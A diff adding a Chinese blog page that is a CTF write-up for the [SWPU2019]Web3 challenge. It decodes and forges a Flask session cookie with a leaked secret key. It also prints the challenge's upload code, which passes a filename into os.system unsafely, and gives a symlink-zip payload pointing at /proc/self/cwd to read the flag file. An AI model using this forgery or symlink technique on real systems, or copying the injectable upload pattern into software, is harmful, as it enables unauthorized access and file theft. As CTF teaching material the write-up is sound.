@@ -1,0 +1,193 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>[SWPU2019]Web3 - Dongq‘s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[SWPU2019]Web3一个登录页面，随便输入什么密码都可以
+抓包发现session有点问题.asd开头，应该是jwt伪造
+然后我们用脚本解码一下试试看
+&amp;#123;&amp;#39;id&amp;#39;: ,"> 
+    <meta name="author" content="Dongq"> 
+    <link rel="alternative" href="atom.xml" title="Dongq‘s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dongq‘s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">[SWPU2019]Web3</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">[SWPU2019]Web3</h1>
+        <div class="stuff">
+            <span>七月 11, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>一个登录页面，随便输入什么密码都可以</p>
+<p>抓包发现session有点问题.asd开头，应该是jwt伪造</p>
+<p>然后我们用脚本解码一下试试看</p>
+<p><code>&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
+
+<p>然后我们随便访问一个页面会出现404，在header中发现了一串base64编码的secret key</p>
+<p>我们伪造jwt</p>
+<p>脚本:flask_session_cookie_manager3.py</p>
+<p><code>python3 flask_session_cookie_manager3.py encode -s &quot;keyqqqwwweee!@#$%^&amp;*&quot; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;&quot;</code></p>
+<p>注意这里-s 和-t 后的参数都要用双引号，否则会出错</p>
+<p>这里每次构造出的jwt都是不一样的</p>
+<p>伪造后，出现了文件上传的页面，在开发者页面找到源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/upload&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;id&#x27;</span>] != <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        name = name+<span class="string">&#x27;qweqweqwe&#x27;</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span>+md5_one+<span class="string">&#x27;/&#x27;</span>+session[<span class="string">&#x27;username&#x27;</span>]+<span class="string">&quot;/&quot;</span></span><br><span class="line">        path_base = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> != filename.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zip only allowed&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -n -d &quot;</span>+path+<span class="string">&quot; &quot;</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">&#x27;|&#x27;</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">&#x27;;&#x27;</span>) != <span class="number">-1</span>:</span><br><span class="line">                waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;is_login&#x27;</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;not login&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">&#x27;/&#x27;</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/showflag&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;can&#x27;t give you&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag&#x2F;flag.jpg test</span><br><span class="line">zip -ry test.zip test</span><br></pre></td></tr></table></figure>
+
+<p>在linux下构造这两个语句，然后上传zip文件</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
